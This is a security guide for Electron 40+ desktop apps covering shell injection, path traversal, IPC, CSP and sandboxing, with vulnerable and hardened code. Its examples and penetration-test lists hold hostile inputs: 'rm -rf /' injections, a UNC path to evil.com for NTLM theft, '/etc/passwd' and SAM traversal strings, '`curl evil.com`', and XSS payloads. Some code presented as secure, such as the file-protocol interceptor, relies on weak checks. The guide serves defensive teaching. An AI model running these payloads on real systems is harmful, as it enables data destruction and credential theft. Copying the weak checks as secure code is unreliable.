# Electron Security Best Practices - January 2026

> **Research Date**: January 21, 2026
> **Target Version**: Electron 40+
> **Focus Areas**: Shell injection, path traversal, IPC security, CSP, sandbox isolation

## Executive Summary

This document provides comprehensive security guidance for Electron 40+ applications based on the latest research as of January 2026. The five critical areas covered are:

1. **Shell Injection Prevention** - Protecting against command injection attacks
2. **Path Traversal Protection** - Validating file system access
3. **IPC Security Patterns** - Secure inter-process communication
4. **Content Security Policy** - XSS and remote code prevention
5. **Sandbox & Context Isolation** - Process-level security boundaries

---

## 1. Shell Injection Prevention

### Overview

Command injection vulnerabilities occur when applications accept unsafe user input and use it as parameters for operating system commands. In Electron apps, this is particularly dangerous because Node.js integration provides direct access to `child_process` module.

### Attack Vector Example

```typescript
// VULNERABLE CODE - Never do this!
import { exec } from 'child_process'

ipcMain.handle('run-command', async (event, userInput) => {
  // Attacker could inject: `; rm -rf / #`
  exec(`ls ${userInput}`, (error, stdout) => {
    return stdout
  })
})
```

### Defense Strategy 1: Use execFile Instead of exec

The **primary defense** is to use `execFile()` instead of `exec()`. The `execFile` function starts a specific program and takes an array of arguments, preventing arbitrary shell commands from being executed.

```typescript
// SECURE CODE - Use execFile with argument array
import { execFile } from 'child_process'
import { promisify } from 'util'

const execFileAsync = promisify(execFile)

ipcMain.handle('list-directory', async (event, dirPath) => {
  try {
    // Validate input first
    if (!isValidPath(dirPath)) {
      throw new Error('Invalid path')
    }

    // execFile prevents shell injection
    const { stdout } = await execFileAsync('ls', ['-la', dirPath], {
      timeout: 5000,
      maxBuffer: 1024 * 1024, // 1MB limit
    })

    return stdout
  } catch (error) {
    console.error('Command execution failed:', error)
    throw new Error('Directory listing failed')
  }
})
```

### Defense Strategy 2: Replace Shell Commands with Node.js APIs

The safest approach is to **avoid shell commands entirely** by using native Node.js APIs.

```typescript
// BEST PRACTICE - Use Node.js built-in APIs
import { readdir, stat } from 'fs/promises'
import { join } from 'path'

ipcMain.handle('list-directory', async (event, dirPath) => {
  try {
    // Validate path
    const safePath = validateAndNormalizePath(dirPath)

    // Use Node.js API instead of shell command
    const entries = await readdir(safePath, { withFileTypes: true })

    const results = await Promise.all(
      entries.map(async (entry) => {
        const fullPath = join(safePath, entry.name)
        const stats = await stat(fullPath)
        return {
          name: entry.name,
          isDirectory: entry.isDirectory(),
          size: stats.size,
          modified: stats.mtime,
        }
      })
    )

    return results
  } catch (error) {
    console.error('Directory listing failed:', error)
    throw new Error('Directory access denied')
  }
})
```

### Defense Strategy 3: Input Validation and Sanitization

When shell commands are unavoidable, implement **strict input validation**.

```typescript
import { z } from 'zod'

// Define allowed input schema with Zod
const FilePathSchema = z
  .string()
  .min(1)
  .max(500)
  .regex(/^[a-zA-Z0-9\/_\-\.]+$/) // Alphanumeric, slash, underscore, hyphen, dot only
  .refine((path) => !path.includes('..'), 'Path traversal not allowed')
  .refine((path) => !path.includes('~'), 'Home directory expansion not allowed')

function validateAndSanitizeCommand(input: string): string {
  // Validate with Zod
  const validated = FilePathSchema.parse(input)

  // Remove shell metacharacters
  const shellMetachars = /[;|&$`<>\n(){}[\]!]/g
  const sanitized = validated.replace(shellMetachars, '')

  // Additional validation
  if (sanitized !== validated) {
    throw new Error('Input contains forbidden characters')
  }

  return sanitized
}
```

### Electron-Specific Security Configuration

```typescript
// main/index.ts
import { BrowserWindow } from 'electron'

function createWindow() {
  const mainWindow = new BrowserWindow({
    webPreferences: {
      // MANDATORY: Disable Node.js in renderer
      nodeIntegration: false,

      // MANDATORY: Enable context isolation
      contextIsolation: true,

      // MANDATORY: Enable sandbox
      sandbox: true,

      // Use preload script for controlled API exposure
      preload: join(__dirname, '../preload/index.js'),
    },
  })
}
```

### Security Checklist for Shell Commands

- [ ] **Never use `exec()` or `spawn()` with `shell: true` on user input**
- [ ] **Use `execFile()` with argument arrays instead**
- [ ] **Prefer Node.js built-in APIs over shell commands**
- [ ] **Validate all inputs with Zod schemas**
- [ ] **Set timeouts and buffer limits on all subprocess calls**
- [ ] **Log all command executions for audit trails**
- [ ] **Never execute commands from renderer process**
- [ ] **Manually review all occurrences of `openExternal`**

---

## 2. Path Traversal Protection

### Overview

Path traversal vulnerabilities allow attackers to access files outside intended directories using sequences like `../` or Windows UNC paths. Electron apps are particularly vulnerable when handling file operations via IPC.

### Common Attack Vectors

```typescript
// VULNERABLE CODE - Path traversal attack
ipcMain.handle('read-file', async (event, filename) => {
  // Attacker sends: "../../../etc/passwd"
  const content = await fs.readFile(filename, 'utf-8')
  return content
})

// VULNERABLE CODE - Windows UNC path attack
protocol.registerFileProtocol('app', (request, callback) => {
  // Attacker sends: app://\\evil.com\share\steal-ntlm
  const url = request.url.substr(6)
  callback({ path: url })
})
```

### Electron-Specific Vulnerability (CVE-2018-1000006)

Electron apps that register custom protocol handlers are vulnerable to directory traversal on Windows. The Electron documentation examples for `RegisterBufferProtocolRequest` were vulnerable to path traversal, allowing attackers to read any file on the filesystem even with `nodeIntegration` disabled.

### Defense Strategy 1: Canonicalize and Validate Paths

```typescript
import { join, normalize, resolve, isAbsolute } from 'path'
import { realpath, access } from 'fs/promises'
import { constants } from 'fs'

// Define allowed base directories
const ALLOWED_BASE_DIRS = [
  resolve(__dirname, '../assets'),
  resolve(__dirname, '../user-data'),
  resolve(__dirname, '../cache'),
]

async function validatePath(userPath: string): Promise<string> {
  try {
    // 1. Reject absolute paths from user
    if (isAbsolute(userPath)) {
      throw new Error('Absolute paths not allowed')
    }

    // 2. Reject paths with traversal sequences
    if (userPath.includes('..') || userPath.includes('~')) {
      throw new Error('Path traversal detected')
    }

    // 3. Reject UNC paths (Windows)
    if (userPath.startsWith('\\\\') || userPath.startsWith('//')) {
      throw new Error('UNC paths not allowed')
    }

    // 4. Normalize the path
    const normalized = normalize(userPath)

    // 5. Try each allowed base directory
    for (const baseDir of ALLOWED_BASE_DIRS) {
      const candidate = join(baseDir, normalized)

      // 6. Resolve symlinks to canonical path
      let canonical: string
      try {
        canonical = await realpath(candidate)
      } catch {
        continue // File doesn't exist in this base dir
      }

      // 7. Verify canonical path starts with allowed base
      if (!canonical.startsWith(baseDir)) {
        throw new Error('Path escapes allowed directory')
      }

      // 8. Check file is readable
      await access(canonical, constants.R_OK)

      // Path is valid!
      return canonical
    }

    throw new Error('File not found in allowed directories')
  } catch (error) {
    console.error('Path validation failed:', error)
    throw new Error('Invalid file path')
  }
}
```

### Defense Strategy 2: Use Allowlists for Extensions and Directories

```typescript
import { extname } from 'path'

const ALLOWED_EXTENSIONS = new Set(['.txt', '.json', '.log', '.md', '.jpg', '.png', '.gif', '.svg'])

const ALLOWED_DIRECTORIES = new Set(['assets', 'user-data', 'cache', 'logs'])

function validateFileAccess(filePath: string): void {
  // Check extension
  const ext = extname(filePath).toLowerCase()
  if (!ALLOWED_EXTENSIONS.has(ext)) {
    throw new Error(`File type ${ext} not allowed`)
  }

  // Check directory
  const parts = filePath.split(path.sep)
  const topDir = parts[0]
  if (!ALLOWED_DIRECTORIES.has(topDir)) {
    throw new Error(`Directory ${topDir} not allowed`)
  }
}
```

### Defense Strategy 3: Custom Protocol Security

When implementing custom protocols (like `app://`), use strict validation:

```typescript
import { protocol } from 'electron'
import { join, normalize } from 'path'
import { readFile } from 'fs/promises'

function registerSecureProtocol() {
  protocol.handle('app', async (request) => {
    try {
      // Parse URL
      const url = new URL(request.url)
      const requestedPath = url.pathname

      // Validate and normalize
      const normalized = normalize(requestedPath)

      // Block traversal
      if (normalized.includes('..') || normalized.startsWith('/..')) {
        return new Response('Forbidden', { status: 403 })
      }

      // Block UNC paths
      if (normalized.includes('\\\\')) {
        return new Response('Forbidden', { status: 403 })
      }

      // Resolve to app resources only
      const resourcePath = join(__dirname, '../resources', normalized)

      // Verify path is within resources directory
      const realResourcePath = await realpath(resourcePath)
      const resourcesDir = await realpath(join(__dirname, '../resources'))

      if (!realResourcePath.startsWith(resourcesDir)) {
        return new Response('Forbidden', { status: 403 })
      }

      // Read and return file
      const content = await readFile(realResourcePath)
      return new Response(content)
    } catch (error) {
      return new Response('Not Found', { status: 404 })
    }
  })
}
```

### Security Checklist for Path Traversal

- [ ] **Never trust user-provided file paths**
- [ ] **Always canonicalize paths with `realpath()`**
- [ ] **Verify canonical path starts with allowed base directory**
- [ ] **Block `..`, `~`, and UNC paths (`\\\\`)**
- [ ] **Use allowlists for extensions and directories**
- [ ] **Validate paths AFTER symlink resolution**
- [ ] **Reject absolute paths from user input**
- [ ] **Use `path.join()` not string concatenation**
- [ ] **Test with malicious inputs**: `../../../etc/passwd`, `\\\\evil.com\\share`

---

## 3. IPC Security Patterns

### Overview

Inter-Process Communication (IPC) in Electron requires careful security design. With **context isolation** enabled (default since Electron 12), the renderer process cannot directly access Electron APIs or Node.js modules. Communication must go through a secure bridge.

### Security Architecture

```
┌─────────────────────┐
│  Renderer Process   │  (Sandboxed, no Node.js access)
│   (React/Vue/etc)   │
└──────────┬──────────┘
           │
           │ contextBridge.exposeInMainWorld()
           │
┌──────────▼──────────┐
│   Preload Script    │  (Has Node.js access, runs before page load)
│  (Type-safe API)    │
└──────────┬──────────┘
           │
           │ ipcRenderer.invoke() → ipcMain.handle()
           │
┌──────────▼──────────┐
│   Main Process      │  (Full Node.js/system access)
│  (Business Logic)   │
└─────────────────────┘
```

### Unsafe Pattern: Direct ipcRenderer Exposure

```typescript
// DANGEROUS - Do NOT do this!
// preload/index.ts
import { contextBridge, ipcRenderer } from 'electron'

contextBridge.exposeInMainWorld('electron', {
  // This exposes ALL IPC channels to renderer!
  send: ipcRenderer.send,
  invoke: ipcRenderer.invoke,
  on: ipcRenderer.on,
})

// Renderer can now send ANY IPC message:
// window.electron.invoke('fs:delete', '/') ❌
```

**Why this is dangerous**: The renderer can invoke ANY IPC handler, including ones you didn't intend to expose. If an XSS vulnerability exists, attackers can call these APIs.

### Safe Pattern: Type-Safe API Layer with Zod Validation

```typescript
// shared/types.ts
import { z } from 'zod'

// Define schemas for all IPC operations
export const ReadFileSchema = z.object({
  path: z.string().min(1).max(500),
})

export const WriteFileSchema = z.object({
  path: z.string().min(1).max(500),
  content: z.string().max(10 * 1024 * 1024), // 10MB limit
})

export const ListDirectorySchema = z.object({
  path: z.string().min(1).max(500),
})

export type ReadFileRequest = z.infer<typeof ReadFileSchema>
export type WriteFileRequest = z.infer<typeof WriteFileSchema>
export type ListDirectoryRequest = z.infer<typeof ListDirectorySchema>
```

```typescript
// preload/index.ts
import { contextBridge, ipcRenderer } from 'electron'
import type { ReadFileRequest, WriteFileRequest, ListDirectoryRequest } from '../shared/types'

// Expose ONLY specific, validated APIs
contextBridge.exposeInMainWorld('electronAPI', {
  // Read file
  readFile: (request: ReadFileRequest): Promise<string> => {
    return ipcRenderer.invoke('file:read', request)
  },

  // Write file
  writeFile: (request: WriteFileRequest): Promise<void> => {
    return ipcRenderer.invoke('file:write', request)
  },

  // List directory
  listDirectory: (request: ListDirectoryRequest): Promise<string[]> => {
    return ipcRenderer.invoke('file:list', request)
  },

  // Event listeners with specific channels only
  onFileChange: (callback: (file: string) => void) => {
    ipcRenderer.on('file:changed', (_event, file) => callback(file))
  },
})

// Augment Window type for TypeScript
declare global {
  interface Window {
    electronAPI: {
      readFile: (request: ReadFileRequest) => Promise<string>
      writeFile: (request: WriteFileRequest) => Promise<void>
      listDirectory: (request: ListDirectoryRequest) => Promise<string[]>
      onFileChange: (callback: (file: string) => void) => void
    }
  }
}
```

```typescript
// main/ipc/handlers.ts
import { ipcMain } from 'electron'
import { ReadFileSchema, WriteFileSchema, ListDirectorySchema } from '../../shared/types'
import { readFile, writeFile, readdir } from 'fs/promises'

export function setupIPCHandlers() {
  // Read file handler
  ipcMain.handle('file:read', async (event, request) => {
    try {
      // 1. Validate input with Zod
      const validated = ReadFileSchema.parse(request)

      // 2. Validate sender (prevent unauthorized renderers)
      if (!isAuthorizedSender(event.sender)) {
        throw new Error('Unauthorized sender')
      }

      // 3. Validate path (prevent traversal)
      const safePath = await validatePath(validated.path)

      // 4. Perform operation
      const content = await readFile(safePath, 'utf-8')

      return content
    } catch (error) {
      console.error('File read failed:', error)
      throw new Error('File read failed')
    }
  })

  // Write file handler
  ipcMain.handle('file:write', async (event, request) => {
    try {
      const validated = WriteFileSchema.parse(request)

      if (!isAuthorizedSender(event.sender)) {
        throw new Error('Unauthorized sender')
      }

      const safePath = await validatePath(validated.path)

      await writeFile(safePath, validated.content, 'utf-8')
    } catch (error) {
      console.error('File write failed:', error)
      throw new Error('File write failed')
    }
  })

  // List directory handler
  ipcMain.handle('file:list', async (event, request) => {
    try {
      const validated = ListDirectorySchema.parse(request)

      if (!isAuthorizedSender(event.sender)) {
        throw new Error('Unauthorized sender')
      }

      const safePath = await validatePath(validated.path)

      const entries = await readdir(safePath)
      return entries
    } catch (error) {
      console.error('Directory listing failed:', error)
      throw new Error('Directory listing failed')
    }
  })
}

// Validate IPC sender
function isAuthorizedSender(sender: Electron.WebContents): boolean {
  // Verify sender is from our app window
  const mainWindow = BrowserWindow.getAllWindows()[0]
  return sender === mainWindow?.webContents
}
```

### Defense Strategy: Sender Validation

**Always validate the sender** of IPC messages to prevent malicious renderers (e.g., from injected iframes) from accessing APIs.

```typescript
import { ipcMain, BrowserWindow } from 'electron'

ipcMain.handle('sensitive-operation', async (event, data) => {
  // Validate sender
  const sender = event.sender
  const mainWindow = BrowserWindow.getAllWindows().find((win) => win.webContents === sender)

  if (!mainWindow) {
    throw new Error('Unauthorized: Unknown sender')
  }

  // Additional validation: check URL
  const senderURL = new URL(sender.getURL())
  if (senderURL.protocol !== 'app:' && senderURL.protocol !== 'file:') {
    throw new Error('Unauthorized: Invalid protocol')
  }

  // Proceed with operation
})
```

### Security Checklist for IPC

- [ ] **Enable `contextIsolation: true` (default)**
- [ ] **Never expose `ipcRenderer` directly**
- [ ] **Use `contextBridge.exposeInMainWorld()` for controlled API**
- [ ] **Validate all IPC inputs with Zod schemas**
- [ ] **Validate IPC sender on every handler**
- [ ] **Use allowlists for channels, not blocklists**
- [ ] **Limit IPC message size (prevent DoS)**
- [ ] **Audit all `ipcRenderer.on()` event listeners**
- [ ] **Remove IPC listeners on component unmount**

---

## 4. Content Security Policy (CSP) Configuration

### Overview

Content Security Policy is a critical defense layer against XSS attacks. In Electron apps, CSP **must be configured** to prevent loading of untrusted scripts, especially since XSS has higher impact when Node.js integration exists.

### The Warning You Should Eliminate

If you see this in DevTools, your app is insecure:

```
Electron Security Warning (Insecure Content-Security-Policy)
This renderer process has either no Content Security Policy set
or a policy with 'unsafe-eval' enabled.
```

This warning was added in Electron 6 and indicates a critical security gap.

### Security Risk

Common web vulnerabilities like XSS have a **higher security impact** on Electron applications. Even with `nodeIntegration: false`, XSS can:

- Access Electron IPC APIs exposed via `contextBridge`
- Steal data from the application
- Exfiltrate credentials
- Perform actions as the authenticated user

### Defense Strategy 1: HTML Meta Tag (Development)

For quick setup during development:

```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8" />
    <meta
      http-equiv="Content-Security-Policy"
      content="
          default-src 'self';
          script-src 'self';
          style-src 'self' 'unsafe-inline';
          img-src 'self' data: https:;
          font-src 'self' data:;
          connect-src 'self' https://api.yourdomain.com;
          object-src 'none';
          base-uri 'self';
          form-action 'self';
          frame-ancestors 'none';
          upgrade-insecure-requests;
        "
    />
    <title>My Electron App</title>
  </head>
  <body>
    <!-- Your app content -->
  </body>
</html>
```

### Defense Strategy 2: HTTP Headers (Production)

For production, configure CSP via HTTP headers using Electron's session API:

```typescript
// main/index.ts
import { app, session } from 'electron'

app.whenReady().then(() => {
  // Set CSP for all requests
  session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
    callback({
      responseHeaders: {
        ...details.responseHeaders,
        'Content-Security-Policy': [buildContentSecurityPolicy()],
        // Additional security headers
        'X-Content-Type-Options': ['nosniff'],
        'X-Frame-Options': ['DENY'],
        'X-XSS-Protection': ['1; mode=block'],
        'Referrer-Policy': ['no-referrer'],
        'Permissions-Policy': ['geolocation=(), microphone=(), camera=()'],
      },
    })
  })
})

function buildContentSecurityPolicy(): string {
  const isDev = process.env.NODE_ENV === 'development'

  // Development CSP (allows hot reload)
  if (isDev) {
    return [
      "default-src 'self'",
      "script-src 'self' 'unsafe-eval'", // unsafe-eval needed for Vite HMR
      "style-src 'self' 'unsafe-inline'",
      "img-src 'self' data: https:",
      "font-src 'self' data:",
      "connect-src 'self' ws://localhost:* http://localhost:*", // HMR websocket
      "object-src 'none'",
      "base-uri 'self'",
    ].join('; ')
  }

  // Production CSP (strict)
  return [
    "default-src 'self'",
    "script-src 'self'", // NO unsafe-eval or unsafe-inline
    "style-src 'self' 'unsafe-inline'", // Allow inline styles for performance
    "img-src 'self' data: https:",
    "font-src 'self' data:",
    "connect-src 'self' https://api.yourdomain.com",
    "object-src 'none'",
    "base-uri 'self'",
    "form-action 'self'",
    "frame-ancestors 'none'",
    'upgrade-insecure-requests',
  ].join('; ')
}
```

### Defense Strategy 3: Nonce-based CSP (Advanced)

For inline scripts that need to execute, use nonces:

```typescript
import { randomBytes } from 'crypto'

let currentNonce: string = ''

function generateNonce(): string {
  currentNonce = randomBytes(16).toString('base64')
  return currentNonce
}

session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
  const nonce = generateNonce()

  callback({
    responseHeaders: {
      ...details.responseHeaders,
      'Content-Security-Policy': [`script-src 'self' 'nonce-${nonce}'`],
    },
  })
})

// In your HTML generation:
function renderHTML(nonce: string): string {
  return `
    <!DOCTYPE html>
    <html>
    <head>
      <script nonce="${nonce}">
        // Inline script allowed
        console.log('App initialized')
      </script>
    </head>
    <body>
      <div id="root"></div>
    </body>
    </html>
  `
}
```

### Defense Strategy 4: CSP Violation Reporting

Monitor CSP violations in production:

```typescript
session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
  callback({
    responseHeaders: {
      ...details.responseHeaders,
      'Content-Security-Policy': [
        buildContentSecurityPolicy(),
        'report-uri https://csp-reports.yourdomain.com/report',
      ].join('; '),
    },
  })
})

// In renderer, catch violations
window.addEventListener('securitypolicyviolation', (e) => {
  console.error('CSP Violation:', {
    blockedURI: e.blockedURI,
    violatedDirective: e.violatedDirective,
    originalPolicy: e.originalPolicy,
  })

  // Send to monitoring service
  window.electronAPI.reportCSPViolation({
    blockedURI: e.blockedURI,
    violatedDirective: e.violatedDirective,
    sourceFile: e.sourceFile,
    lineNumber: e.lineNumber,
  })
})
```

### CSP Directive Reference

| Directive         | Purpose                        | Recommended Value               |
| ----------------- | ------------------------------ | ------------------------------- |
| `default-src`     | Default for all resource types | `'self'`                        |
| `script-src`      | JavaScript sources             | `'self'` (strict)               |
| `style-src`       | CSS sources                    | `'self' 'unsafe-inline'`        |
| `img-src`         | Image sources                  | `'self' data: https:`           |
| `font-src`        | Font sources                   | `'self' data:`                  |
| `connect-src`     | Fetch/XHR endpoints            | `'self' https://api.domain.com` |
| `object-src`      | Plugins (Flash, etc)           | `'none'`                        |
| `base-uri`        | `<base>` tag restriction       | `'self'`                        |
| `form-action`     | Form submission targets        | `'self'`                        |
| `frame-ancestors` | Embedding in frames            | `'none'`                        |

### Security Checklist for CSP

- [ ] **Define CSP for all pages**
- [ ] **Use `'self'` for script-src (no unsafe-eval in production)**
- [ ] **Block `object-src` and `base-uri`**
- [ ] **Use HTTPS-only for external resources**
- [ ] **Enable CSP violation reporting**
- [ ] **Test CSP doesn't break app functionality**
- [ ] **Different CSP for dev (HMR) vs production**
- [ ] **Set `X-Content-Type-Options: nosniff`**
- [ ] **Set `X-Frame-Options: DENY`**

---

## 5. Sandbox and Context Isolation

### Overview

Electron 40+ includes significant improvements to process sandboxing and context isolation. These are your **primary defense layers** against exploitation.

### Security Architecture

```
┌─────────────────────────────────────┐
│      Main Process (Privileged)      │
│   - Full Node.js API access         │
│   - File system access              │
│   - Native modules                  │
│   - Child process spawning          │
└─────────────────┬───────────────────┘
                  │
                  │ IPC Bridge
                  │
┌─────────────────▼───────────────────┐
│   Renderer Process (Sandboxed)      │
│   ┌─────────────────────────────┐   │
│   │  Isolated World (Web Page)  │   │  ← No Node.js access
│   │  - Your React/Vue app       │   │  ← No Electron APIs
│   │  - Untrusted web content    │   │  ← Subject to CSP
│   └─────────────────────────────┘   │
│                                     │
│   ┌─────────────────────────────┐   │
│   │  Preload Context (Bridge)   │   │  ← Has Node.js access
│   │  - contextBridge API        │   │  ← Exposes controlled API
│   │  - Runs before page load    │   │  ← Type-safe interface
│   └─────────────────────────────┘   │
└─────────────────────────────────────┘
```

### Critical Configuration

```typescript
// main/index.ts
import { BrowserWindow } from 'electron'

function createWindow() {
  const mainWindow = new BrowserWindow({
    width: 1200,
    height: 800,
    webPreferences: {
      // MANDATORY: Disable Node.js integration in renderer
      nodeIntegration: false,

      // MANDATORY: Enable context isolation (default since Electron 12)
      contextIsolation: true,

      // MANDATORY: Enable sandbox (default since Electron 20)
      sandbox: true,

      // Preload script for controlled API exposure
      preload: join(__dirname, '../preload/index.js'),

      // RECOMMENDED: Disable remote module (removed in Electron 14+)
      // enableRemoteModule: false, (no longer exists)

      // RECOMMENDED: Disable web security only for dev
      webSecurity: process.env.NODE_ENV !== 'development',

      // RECOMMENDED: Prevent navigation
      navigateOnDragDrop: false,

      // RECOMMENDED: Disable auxiliary click
      disableBlinkFeatures: 'Auxclick',
    },
  })

  // CRITICAL: Prevent navigation to external sites
  mainWindow.webContents.on('will-navigate', (event, navigationUrl) => {
    const parsedUrl = new URL(navigationUrl)

    // Only allow navigation to app protocol
    if (parsedUrl.protocol !== 'app:' && parsedUrl.protocol !== 'file:') {
      event.preventDefault()
      console.warn('Navigation blocked:', navigationUrl)
    }
  })

  // CRITICAL: Prevent opening new windows
  mainWindow.webContents.setWindowOpenHandler(({ url }) => {
    // Open external URLs in default browser
    if (url.startsWith('http:') || url.startsWith('https:')) {
      shell.openExternal(url)
    }

    return { action: 'deny' }
  })

  return mainWindow
}
```

### Context Isolation Deep Dive

**What is Context Isolation?**

Context isolation ensures that preload scripts and Electron's internal logic run in a **separate JavaScript context** from the web page loaded in the renderer.

**Without Context Isolation (UNSAFE):**

```typescript
// preload.ts (old, unsafe way)
window.myAPI = {
  dangerous: () => require('child_process').exec('rm -rf /'),
}

// Web page can access:
window.myAPI.dangerous() // ❌ Disaster!
```

**With Context Isolation (SAFE):**

```typescript
// preload.ts (safe way)
import { contextBridge } from 'electron'

contextBridge.exposeInMainWorld('myAPI', {
  safeOperation: () => {
    // This function runs in isolated context
    return 'safe result'
  },
})

// Web page accesses via bridge:
window.myAPI.safeOperation() // ✅ Safe
```

The `window` object in your preload script is **different** from the `window` object in the web page. If you set `window.hello = 'wave'` in preload, the web page will see `window.hello === undefined`.

### Sandbox Mode Benefits

When `sandbox: true` (default since Electron 20):

1. **Process-level isolation** via OS mechanisms
2. **Restricted syscalls** - renderer cannot spawn processes
3. **Limited file system access** - must go through main process
4. **Memory protection** - cannot read main process memory
5. **Chromium's sandbox** - full Chrome security model

### ASAR Integrity (Electron 39+)

ASAR integrity validation was stabilized in Electron 39, preventing tampering with your packaged app:

```typescript
// electron-builder.config.js
export default {
  asar: true,
  asarUnpack: ['**/node_modules/better-sqlite3/**/*'],
  afterPack: async (context) => {
    const { appOutDir, packager } = context

    // Enable ASAR integrity
    packager.config.asarIntegrity = {
      algorithm: 'SHA256',
      checksums: true,
    }
  },
}
```

At runtime, Electron validates your `app.asar` against a build-time hash. If tampering is detected, the app refuses to start.

### Electron 40 Security Improvements

Based on January 2026 release:

1. **Cookie Encryption**: Fixed cookie encryption logic on Windows/Linux
2. **WebSocket Authentication**: Added support for WebSocket auth through login events
3. **Chromium 144**: Latest security patches from upstream
4. **Node 24.11.1**: Security fixes from Node.js LTS

### Security Checklist for Sandbox/Isolation

- [ ] **Set `nodeIntegration: false`**
- [ ] **Set `contextIsolation: true`**
- [ ] **Set `sandbox: true`**
- [ ] **Block navigation with `will-navigate` handler**
- [ ] **Block popups with `setWindowOpenHandler`**
- [ ] **Use `contextBridge.exposeInMainWorld()` for APIs**
- [ ] **Enable ASAR integrity in Electron 39+**
- [ ] **Keep Electron, Chromium, Node.js up-to-date**
- [ ] **Audit preload scripts for exposed APIs**
- [ ] **Test app with `--disable-web-security` flag removed**

---

## Complete Security Configuration Template

Here's a production-ready security configuration:

```typescript
// main/index.ts - Complete secure setup
import { app, BrowserWindow, session, shell, ipcMain } from 'electron'
import { join } from 'path'

// Enable sandbox for all renderers (Electron 20+ default)
app.enableSandbox()

app.whenReady().then(async () => {
  // Configure session security
  configureSessionSecurity()

  // Setup IPC handlers
  setupSecureIPCHandlers()

  // Create window
  const mainWindow = createSecureWindow()

  // Load app
  if (process.env.NODE_ENV === 'development') {
    mainWindow.loadURL('http://localhost:5173')
    mainWindow.webContents.openDevTools()
  } else {
    mainWindow.loadFile(join(__dirname, '../renderer/index.html'))
  }
})

function configureSessionSecurity() {
  // Set CSP
  session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
    callback({
      responseHeaders: {
        ...details.responseHeaders,
        'Content-Security-Policy': [buildCSP()],
        'X-Content-Type-Options': ['nosniff'],
        'X-Frame-Options': ['DENY'],
        'X-XSS-Protection': ['1; mode=block'],
        'Referrer-Policy': ['no-referrer'],
      },
    })
  })

  // Block insecure protocols
  session.defaultSession.protocol.interceptFileProtocol('file', (request, callback) => {
    const url = request.url.substr(7)

    // Validate path
    if (url.includes('..') || url.includes('~')) {
      callback({ error: -6 }) // net::ERR_FILE_NOT_FOUND
      return
    }

    callback({ path: url })
  })

  // Set permissions
  session.defaultSession.setPermissionRequestHandler((webContents, permission, callback) => {
    const allowedPermissions = new Set(['clipboard-read', 'clipboard-write'])

    callback(allowedPermissions.has(permission))
  })
}

function createSecureWindow(): BrowserWindow {
  const mainWindow = new BrowserWindow({
    width: 1200,
    height: 800,
    webPreferences: {
      nodeIntegration: false,
      contextIsolation: true,
      sandbox: true,
      preload: join(__dirname, '../preload/index.js'),
      webSecurity: true,
      navigateOnDragDrop: false,
      disableBlinkFeatures: 'Auxclick',
    },
  })

  // Prevent navigation
  mainWindow.webContents.on('will-navigate', (event, url) => {
    if (!isAllowedURL(url)) {
      event.preventDefault()
      console.warn('Navigation blocked:', url)
    }
  })

  // Handle new windows
  mainWindow.webContents.setWindowOpenHandler(({ url }) => {
    if (url.startsWith('http:') || url.startsWith('https:')) {
      shell.openExternal(url)
    }
    return { action: 'deny' }
  })

  // Monitor console errors
  mainWindow.webContents.on('console-message', (event, level, message) => {
    if (level === 3) {
      // Error
      console.error('Renderer error:', message)
    }
  })

  return mainWindow
}

function isAllowedURL(url: string): boolean {
  try {
    const parsed = new URL(url)
    return parsed.protocol === 'app:' || parsed.protocol === 'file:'
  } catch {
    return false
  }
}

function buildCSP(): string {
  const isDev = process.env.NODE_ENV === 'development'

  if (isDev) {
    return [
      "default-src 'self'",
      "script-src 'self' 'unsafe-eval'",
      "style-src 'self' 'unsafe-inline'",
      "connect-src 'self' ws://localhost:*",
    ].join('; ')
  }

  return [
    "default-src 'self'",
    "script-src 'self'",
    "style-src 'self' 'unsafe-inline'",
    "img-src 'self' data:",
    "connect-src 'self'",
    "object-src 'none'",
    "base-uri 'self'",
  ].join('; ')
}

function setupSecureIPCHandlers() {
  // See section 3 for secure IPC handler implementation
}
```

---

## Testing Your Security Configuration

### Security Audit Checklist

Run these tests to verify your security posture:

```bash
# 1. Check Electron version
npm list electron
# Should be 40.0.0 or later

# 2. Audit dependencies for vulnerabilities
npm audit --production
# Should show 0 vulnerabilities

# 3. Use electronegativity scanner
npx @doyensec/electronegativity --input . --output report.sarif
# Review findings

# 4. Test with security headers
curl -I http://localhost:5173
# Verify CSP, X-Frame-Options, etc.

# 5. Test path traversal
# Try accessing: ../../../etc/passwd
# Should be blocked

# 6. Test shell injection
# Try input: `; rm -rf /`
# Should be sanitized/rejected

# 7. Test IPC access
# From renderer console: window.electronAPI
# Should only show intended APIs
```

### Penetration Testing Scenarios

Test these attack scenarios:

```typescript
// Test 1: XSS attempts
const xssPayloads = [
  '<script>alert(1)</script>',
  '<img src=x onerror=alert(1)>',
  'javascript:alert(1)',
]

xssPayloads.forEach((payload) => {
  // Try injecting into forms, search inputs, etc.
  // Should be sanitized by CSP
})

// Test 2: Path traversal
const pathTraversalPayloads = [
  '../../../etc/passwd',
  '..\\..\\..\\windows\\system32\\config\\sam',
  '/etc/shadow',
  'C:\\Windows\\System32\\config\\SAM',
]

pathTraversalPayloads.forEach(async (payload) => {
  try {
    await window.electronAPI.readFile({ path: payload })
    console.error('❌ Path traversal not blocked!')
  } catch {
    console.log('✅ Path traversal blocked')
  }
})

// Test 3: Shell injection
const shellInjectionPayloads = ['; rm -rf /', '| cat /etc/passwd', '&& whoami', '`curl evil.com`']

shellInjectionPayloads.forEach(async (payload) => {
  try {
    await window.electronAPI.runCommand(`ls ${payload}`)
    console.error('❌ Shell injection not blocked!')
  } catch {
    console.log('✅ Shell injection blocked')
  }
})
```

---

## References

### Official Electron Documentation

- [Security | Electron](https://www.electronjs.org/docs/latest/tutorial/security) - Official security guide
- [Context Isolation | Electron](https://www.electronjs.org/docs/latest/tutorial/context-isolation) - Context isolation documentation
- [Inter-Process Communication | Electron](https://www.electronjs.org/docs/latest/tutorial/ipc) - IPC patterns
- [Electron 40.0.0 | Electron](https://www.electronjs.org/blog/electron-40-0) - Latest release notes

### Security Research & Tools

- [Electron Security Checklist](https://www.doyensec.com/resources/us-17-Carettoni-Electronegativity-A-Study-Of-Electron-Security-wp.pdf) - Doyensec research (PDF)
- [Electron contextIsolation RCE via IPC - HackTricks](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/electron-contextisolation-rce-via-ipc.html) - Attack techniques
